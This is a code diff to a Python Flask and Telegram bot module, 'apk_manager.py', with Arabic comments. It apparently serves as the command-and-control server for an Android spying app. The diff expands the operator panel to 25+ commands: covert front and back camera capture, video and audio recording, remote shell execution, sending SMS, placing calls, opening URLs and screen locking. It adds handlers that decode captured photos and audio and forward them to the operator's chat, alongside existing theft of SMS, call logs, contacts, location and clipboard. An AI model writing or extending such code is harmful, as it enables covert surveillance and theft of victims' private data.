@@ -1,6 +1,6 @@
 # apk_manager.py
 # ============================================================
-# APK Manager — إدارة الأجهزة المتصلة + التحقق
+# APK Manager — إدارة الأجهزة المتصلة + 25+ أمر
 # ============================================================
 
 import os
@@ -10,6 +10,7 @@ import time
 import uuid
 import random
 import string
+import base64
 import threading
 import redis
 from flask import Blueprint, request, jsonify
@@ -95,30 +96,75 @@ def push_apk_command(device_id, action, **kwargs):
 
 
 # ============================================================
-# لوحة التحكم
+# لوحة التحكم الشاملة — 25+ أمر
 # ============================================================
 def build_apk_panel(device_id):
     m = InlineKeyboardMarkup()
+    
+    # 📸 الكاميرا
+    m.row(
+        InlineKeyboardButton("📷 كاميرا أمامية", callback_data=f"apk_cmd_camera_front_{device_id}"),
+        InlineKeyboardButton("📸 كاميرا خلفية", callback_data=f"apk_cmd_camera_back_{device_id}"),
+    )
+    m.row(
+        InlineKeyboardButton("🎥 تسجيل فيديو", callback_data=f"apk_cmd_camera_record_{device_id}"),
+    )
+    
+    # 🎙️ الصوت
+    m.row(
+        InlineKeyboardButton("🎙️ تسجيل صوتي 10s", callback_data=f"apk_cmd_record_audio_{device_id}"),
+    )
+    m.row(
+        InlineKeyboardButton("🔔 نغمة إشعار", callback_data=f"apk_cmd_play_sound_{device_id}"),
+        InlineKeyboardButton("🚨 إنذار", callback_data=f"apk_cmd_play_alarm_{device_id}"),
+    )
+    
+    # 📊 البيانات
     m.row(
         InlineKeyboardButton("📱 معلومات", callback_data=f"apk_cmd_info_{device_id}"),
+        InlineKeyboardButton("🔋 بطارية", callback_data=f"apk_cmd_battery_{device_id}"),
+    )
+    m.row(
         InlineKeyboardButton("📨 SMS", callback_data=f"apk_cmd_sms_{device_id}"),
-    )
-    m.row(
         InlineKeyboardButton("📞 المكالمات", callback_data=f"apk_cmd_calls_{device_id}"),
+    )
+    m.row(
         InlineKeyboardButton("👥 جهات الاتصال", callback_data=f"apk_cmd_contacts_{device_id}"),
-    )
-    m.row(
         InlineKeyboardButton("📲 التطبيقات", callback_data=f"apk_cmd_apps_{device_id}"),
-        InlineKeyboardButton("🖼️ الصور", callback_data=f"apk_cmd_photos_{device_id}"),
     )
     m.row(
+        InlineKeyboardButton("🖼️ الصور", callback_data=f"apk_cmd_photos_{device_id}"),
         InlineKeyboardButton("📍 الموقع", callback_data=f"apk_cmd_location_{device_id}"),
+    )
+    m.row(
         InlineKeyboardButton("📋 الحافظة", callback_data=f"apk_cmd_clipboard_{device_id}"),
     )
+    
+    # 🎮 التحكم
     m.row(
         InlineKeyboardButton("📳 اهتزاز", callback_data=f"apk_cmd_vibrate_{device_id}"),
-        InlineKeyboardButton("🔔 صوت", callback_data=f"apk_cmd_sound_{device_id}"),
+        InlineKeyboardButton("🔊 رفع الصوت", callback_data=f"apk_cmd_volume_max_{device_id}"),
     )
+    m.row(
+        InlineKeyboardButton("💬 رسالة Toast", callback_data=f"apk_cmd_toast_{device_id}"),
+        InlineKeyboardButton("💻 أمر Shell", callback_data=f"apk_cmd_shell_{device_id}"),
+    )
+    m.row(
+        InlineKeyboardButton("🔒 قفل الشاشة", callback_data=f"apk_cmd_lock_screen_{device_id}"),
+        InlineKeyboardButton("🏠 الشاشة الرئيسية", callback_data=f"apk_cmd_show_home_{device_id}"),
+    )
+    
+    # 📨 إرسال
+    m.row(
+        InlineKeyboardButton("✉️ إرسال SMS", callback_data=f"apk_cmd_send_sms_{device_id}"),
+        InlineKeyboardButton("📞 بدء مكالمة", callback_data=f"apk_cmd_call_{device_id}"),
+    )
+    
+    # 🌐 فتح رابط
+    m.row(
+        InlineKeyboardButton("🌐 فتح رابط", callback_data=f"apk_cmd_open_url_{device_id}"),
+    )
+    
     return m
 
 
@@ -128,7 +174,7 @@ def build_apk_panel(device_id):
 def init_apk_routes(app, bot):
 
     # ============================================================
-    # ★ اختبار الاتصال — للتشخيص ★
+    # ★ اختبار الاتصال ★
     # ============================================================
     @app.route('/apk/test', methods=['GET'])
     def apk_test():
@@ -136,7 +182,6 @@ def init_apk_routes(app, bot):
         device = request.args.get('device', '')
         print(f"[TEST] APK connected! Code: {code} | Device: {device[:16]}")
         
-        # أبلغ المستخدم
         if code and code != "DEFAULT":
             try:
                 chat_id = get_apk_code(code)
@@ -223,7 +268,6 @@ def init_apk_routes(app, bot):
                 }
                 print(f"[+] New APK device connected: {device_id[:16]} | code={code}")
                 
-                # ★ أرسل إشعار للمستخدم عند أول اتصال ★
                 if chat_id:
                     try:
                         cid = int(chat_id) if str(chat_id).isdigit() else chat_id
@@ -245,6 +289,9 @@ def init_apk_routes(app, bot):
                 commands = apk_commands[device_id]
                 apk_commands[device_id] = []
         
+        if commands:
+            print(f"[+] Sending {len(commands)} commands to {device_id[:8]}")
+        
         return jsonify({"commands": commands}), 200
 
     # ============================================================
@@ -258,12 +305,11 @@ def init_apk_routes(app, bot):
             code = data.get("code", "").upper()
             dtype = data.get("type", "")
             
-            print(f"[APK DATA] type={dtype} | device={device_id[:16] if device_id else 'None'} | code={code}")
+            print(f"[APK DATA] type={dtype} | device={device_id[:16] if device_id else 'None'}")
             
             if not device_id:
                 return jsonify({"status": "no_device"}), 200
             
-            # ابحث عن chat_id
             chat_id = None
             with apk_lock:
                 if device_id in apk_devices:
@@ -273,12 +319,14 @@ def init_apk_routes(app, bot):
                 chat_id = get_apk_code(code)
             
             if not chat_id:
-                print(f"[-] APK data with no chat_id: device={device_id[:8]}, code={code}")
+                print(f"[-] APK data with no chat_id")
                 return jsonify({"status": "no_chat"}), 200
             
             cid = int(chat_id) if str(chat_id).isdigit() else chat_id
             
-            # ---------- initial ----------
+            # ============================================================
+            # initial
+            # ============================================================
             if dtype == "initial":
                 with apk_lock:
                     if device_id in apk_devices:
@@ -297,6 +345,9 @@ def init_apk_routes(app, bot):
                 bot.send_message(cid, "اختر الأمر:",
                     reply_markup=build_apk_panel(device_id))
             
+            # ============================================================
+            # معلومات الجهاز
+            # ============================================================
             elif dtype == "device_info":
                 text = (
                     f"📱 **معلومات الجهاز**\n"
@@ -308,6 +359,21 @@ def init_apk_routes(app, bot):
                 )
                 bot.send_message(cid, text, parse_mode="Markdown")
             
+            # ============================================================
+            # البطارية
+            # ============================================================
+            elif dtype == "battery":
+                text = (
+                    f"🔋 **البطارية**\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"📊 المستوى: `{data.get('level', 'N/A')}%`\n"
+                    f"⚡ الحالة: `{'يشحن' if data.get('charging') else 'لا يشحن'}`"
+                )
+                bot.send_message(cid, text, parse_mode="Markdown")
+            
+            # ============================================================
+            # SMS
+            # ============================================================
             elif dtype == "sms":
                 sms_list = data.get("sms", [])
                 if not sms_list:
@@ -320,6 +386,9 @@ def init_apk_routes(app, bot):
                     for i in range(0, len(msg), 4000):
                         bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")
             
+            # ============================================================
+            # المكالمات
+            # ============================================================
             elif dtype == "call_log":
                 calls = data.get("calls", [])
                 type_map = {"1": "📥", "2": "📤", "3": "❌"}
@@ -329,6 +398,9 @@ def init_apk_routes(app, bot):
                     lines.append(f"{t} `{c.get('number')}` ({c.get('duration')}s)")
                 bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
             
+            # ============================================================
+            # جهات الاتصال
+            # ============================================================
             elif dtype == "contacts":
                 contacts = data.get("contacts", [])
                 lines = [f"👥 **جهات الاتصال ({len(contacts)}):**", "━━━━━━━━━━━━━━━"]
@@ -338,6 +410,9 @@ def init_apk_routes(app, bot):
                 for i in range(0, len(msg), 4000):
                     bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")
             
+            # ============================================================
+            # التطبيقات
+            # ============================================================
             elif dtype == "apps":
                 apps = data.get("apps", [])
                 lines = [f"📲 **التطبيقات ({len(apps)}):**", "━━━━━━━━━━━━━━━"]
@@ -347,6 +422,9 @@ def init_apk_routes(app, bot):
                 for i in range(0, len(msg), 4000):
                     bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")
             
+            # ============================================================
+            # الصور
+            # ============================================================
             elif dtype == "photos":
                 photos = data.get("photos", [])
                 lines = [f"🖼️ **الصور ({len(photos)}):**"]
@@ -354,6 +432,9 @@ def init_apk_routes(app, bot):
                     lines.append(f"• `{p.get('path')}`")
                 bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
             
+            # ============================================================
+            # الموقع
+            # ============================================================
             elif dtype == "location":
                 lat = data.get("lat")
                 lng = data.get("lng")
@@ -365,6 +446,9 @@ def init_apk_routes(app, bot):
                 else:
                     bot.send_message(cid, "❌ لا يوجد موقع")
             
+            # ============================================================
+            # الحافظة
+            # ============================================================
             elif dtype == "clipboard":
                 text = data.get("text", "")
                 if text:
@@ -373,6 +457,51 @@ def init_apk_routes(app, bot):
                 else:
                     bot.send_message(cid, "📋 الحافظة فارغة")
             
+            # ============================================================
+            # 📸 صورة من الكاميرا
+            # ============================================================
+            elif dtype == "camera_photo":
+                image_data = data.get("image", "")
+                camera_name = data.get("camera_name", "")
+                
+                if image_data and image_data.startswith("data:image"):
+                    try:
+                        _, encoded = image_data.split(",", 1)
+                        img_bytes = base64.b64decode(encoded)
+                        buf = io.BytesIO(img_bytes)
+                        buf.name = f"camera_{camera_name}.jpg"
+                        
+                        caption = f"📸 **صورة من الكاميرا {'الأمامية' if camera_name == 'front' else 'الخلفية'}**"
+                        bot.send_photo(cid, buf, caption=caption, parse_mode="Markdown")
+                    except Exception as e:
+                        bot.send_message(cid, f"❌ فشل إرسال الصورة: {e}")
+                else:
+                    bot.send_message(cid, "❌ لم يتم استلام صورة")
+            
+            # ============================================================
+            # 🎙️ تسجيل صوتي
+            # ============================================================
+            elif dtype == "audio_record":
+                audio_data = data.get("audio", "")
+                duration = data.get("duration", 0)
+                
+                if audio_data and audio_data.startswith("data:audio"):
+                    try:
+                        _, encoded = audio_data.split(",", 1)
+                        aud_bytes = base64.b64decode(encoded)
+                        buf = io.BytesIO(aud_bytes)
+                        buf.name = "record.3gp"
+                        
+                        caption = f"🎙️ **تسجيل صوتي ({duration}ms)**"
+                        bot.send_audio(cid, buf, caption=caption, parse_mode="Markdown")
+                    except Exception as e:
+                        bot.send_message(cid, f"❌ فشل إرسال الصوت: {e}")
+                else:
+                    bot.send_message(cid, "❌ لم يتم استلام صوت")
+            
+            # ============================================================
+            # Shell Result
+            # ============================================================
             elif dtype == "shell_result":
                 cmd = data.get("command", "")
                 output = data.get("output", "")
